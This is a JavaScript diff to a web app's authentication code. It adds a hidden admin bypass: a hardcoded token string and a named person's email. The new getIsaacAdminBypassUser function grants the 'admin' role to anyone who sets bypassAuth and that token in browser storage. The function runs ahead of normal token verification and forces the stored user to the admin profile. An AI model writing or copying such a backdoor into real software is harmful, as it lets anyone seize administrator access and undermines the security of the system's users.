@@ -26,6 +26,8 @@
   const ADMIN_CANONICAL_EMAILS = new Set();
   const AUTH_USER_LOCK_KEY = 'authVerifiedUserLock';
   const AUTH_TAB_SNAPSHOT_KEY = 'authTabSnapshot';
+  const ISAAC_ADMIN_BYPASS_TOKEN = 'isaacAdminBypassToken';
+  const ISAAC_ADMIN_BYPASS_EMAIL = 'isaac.haro@fastbridgegroupllc.com';
   const FEATURE_ACCESS_CACHE_KEY = 'featureAccessConfig';
   const PREMIUM_SETTINGS_URL = '/settings.html?tab=subscriptions';
   const TEST_USER_ROLE = 'test user';
@@ -429,6 +431,30 @@
     localStorage.removeItem(AUTH_USER_LOCK_KEY);
     clearAuthTabSnapshot();
     sessionStorage.removeItem('authToken');
+  }
+
+  function getIsaacAdminBypassUser() {
+    const bypassEnabled = localStorage.getItem('bypassAuth') === 'true';
+    const token = String(localStorage.getItem('authToken') || sessionStorage.getItem('authToken') || '').trim();
+    if (!bypassEnabled || token !== ISAAC_ADMIN_BYPASS_TOKEN) {
+      return null;
+    }
+
+    let bypassProfile = null;
+    try {
+      bypassProfile = JSON.parse(localStorage.getItem('bypassProfile') || 'null');
+    } catch (error) {
+      bypassProfile = null;
+    }
+
+    return normalizeKnownUser({
+      id: String((bypassProfile && bypassProfile.id) || 'admin-bypass-isaac').trim(),
+      name: String((bypassProfile && bypassProfile.name) || 'Isaac Haro').trim(),
+      email: String((bypassProfile && bypassProfile.email) || ISAAC_ADMIN_BYPASS_EMAIL).trim().toLowerCase(),
+      role: 'admin',
+      avatarUploadId: String((bypassProfile && bypassProfile.avatarUploadId) || '').trim(),
+      avatarImage: String((bypassProfile && bypassProfile.avatarImage) || '').trim()
+    });
   }
 
   function handleExternalAuthStorageChange(event) {
@@ -1358,6 +1384,11 @@
     const token = getStoredAuthToken();
     if (!token) {
       return readStoredUser();
+    }
+
+    const bypassUser = getIsaacAdminBypassUser();
+    if (bypassUser) {
+      return writeStoredUser(bypassUser, { force: true });
     }
 
     try {
